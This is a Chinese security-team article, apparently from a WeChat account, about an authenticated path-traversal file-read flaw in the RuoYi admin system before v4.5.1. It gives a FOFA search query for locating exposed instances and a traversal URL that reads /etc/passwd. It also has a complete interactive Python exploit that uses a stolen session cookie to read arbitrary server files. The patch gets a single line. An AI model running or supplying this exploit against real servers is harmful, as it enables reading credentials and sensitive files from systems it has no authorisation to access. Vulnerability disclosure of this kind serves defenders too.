> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/zrVTiHCCymlnrERrSJOUog)

**点击蓝字**

![图片](https://mmbiz.qpic.cn/mmbiz_gif/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9oQBNHYEQk7MPDOkic6ARSZ7bt0ysicTvWBjg4MbSDfb28fn5PaiaqUSng/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1)

**关注我们**

  

  

**_声明  
_**

本文作者：PeiQi

本文字数：1243

阅读时长：10min

附件/链接：点击查看原文下载

声明：文章仅供学习参考，请勿用作违法用途，否则后果自负

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

  

  

  

**_前言_**

  

  

一、

**_漏洞描述_**

若依管理系统是基于SpringBoot的权限管理系统,登录后台后可以读取服务器上的任意文件  

二、

**_漏洞影响_**

RuoYi < v4.5.1

**三、**

**_漏洞复现_**

FOFA查询语句

```
app="若依-管理系统" && body="admin"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAxzs02coF0icbuc9Mb25RgTQibR6MjfgoKOSkBRNbDC7cHRk5B9t7EV5icBUiaIw2QPoy6kXjRRTNSUw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

登录后台后访问 Url  

https://xxx.xxx.xxx.xxx/common/download/resource?resource=/profile/../../../../etc/passwd

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAxzs02coF0icbuc9Mb25RgTicYActF4oc3S5Jb5ib6lp1Drc02BA8zxI8X1NOm3hicPLVNrZgJ9Luv7Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

访问后会下载文件 **/etc/passwd**

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAxzs02coF0icbuc9Mb25RgTKUh1HjKrJpUgO4WORO1EgFm4mWKo2OmgEfG7huY5VUMXzMkwxhRREw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

可以使用Burp抓包改变 **/etc/passwd** 为其他文件路径获取敏感信息  

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAxzs02coF0icbuc9Mb25RgT4u4caofibw4kCuyGibzhAxnqYtUwiciakcoxhBvcoGSHJdy83j1caqr3mg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAxzs02coF0icbuc9Mb25RgT3ibFBwpic9ia2NFmdJYA9B9PtDIQudDN3OTUdxx7sFvAv7sJ3gLHesDjw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAxzs02coF0icbuc9Mb25RgTibGmyXMWpQOF279wn4yIQWDjmDZaQXdRsUOEO9uaiaB1JGbnZsEqFfuQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

在更新的版本中添加了危险字符的过滤

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAxzs02coF0icbuc9Mb25RgTyqKTlgyxUD0FaC8epfSRhlnXPmxVH7QK2yNxzckcFiaEYGTBLytaKSQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

**四、**

**_漏洞POC_**

POC使用需要后台的Cookie,读取的文件路径应为根路径

```
`import requests``import sys``import random``import re``from requests.packages.urllib3.exceptions import InsecureRequestWarning``def title():` `print('+------------------------------------------')` `print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')` `print('+  \033[34mVersion: RuoYi < v4.5.1                                            \033[0m')` `print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')` `print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')` `print('+  \033[36mCookie      >>> JSESSIONID=xxxxxx                                   \033[0m')` `print('+  \033[36mFile        >>> /etc/passwd                                         \033[0m')` `print('+------------------------------------------')``def POC_1(target_url, Cookie):` `vuln_url = target_url + "/common/download/resource?resource=/profile/../../../../etc/passwd"` `headers = {` `"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",` `"Cookie":Cookie` `}` `try:` `requests.packages.urllib3.disable_warnings(InsecureRequestWarning)` `response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)` `print("\033[32m[o] 正在请求 {}//common/download/resource?resource=/profile/../../../../etc/passwd \033[0m".format(target_url))` `if "root" in response.text and response.status_code == 200:` `print("\033[32m[o] 目标 {}存在漏洞 ,成功读取 /etc/passwd \033[0m".format(target_url))` `print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))` `while True:` `Filename = input("\033[35mFile >>> \033[0m")` `if Filename == "exit":` `sys.exit(0)` `else:` `POC_2(target_url, Cookie, Filename)` `else:` `print("\033[31m[x] 请求失败 \033[0m")` `sys.exit(0)` `except Exception as e:` `print("\033[31m[x] 请求失败 \033[0m", e)``def POC_2(target_url, Cookie, Filename):` `vuln_url = target_url + "/common/download/resource?resource=/profile/../../../../{}".format(Filename)` `headers = {` `"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",` `"Cookie":Cookie` `}` `try:` `requests.packages.urllib3.disable_warnings(InsecureRequestWarning)` `response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)` `print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))` `except Exception as e:` `print("\033[31m[x] 请求失败 \033[0m", e)``if __name__ == '__main__':` `title()` `target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))` `Cookie = str(input("\033[35mCookie >>> \033[0m"))` `POC_1(target_url, Cookie)`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**团队【PeiQi】师傅的微信二维码放在这了**

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzBVvicBFUlseTHFTXALE0D9XhJILPG5qnhYyI1fjI4vqjV0MgnUM4ibYRfCFaV4wk5FRaGibxMptiadRw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

  

  

**_扫描关注公众号回复加群_**

**_和师傅们一起讨论研究~_**

  

**长**

**按**

**关**

**注**

**WgpSec狼组安全团队**

微信号：wgpsec

Twitter：@wgpsec

  

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/4LicHRMXdTzBhAsD8IU7jiccdSHt39PeyFafMeibktnt9icyS2D2fQrTSS7wdMicbrVlkqfmic6z6cCTlZVRyDicLTrqg/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/gdsKIbdQtWAicUIic1QVWzsMLB46NuRg1fbH0q4M7iam8o1oibXgDBNCpwDAmS3ibvRpRIVhHEJRmiaPS5KvACNB5WgQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1)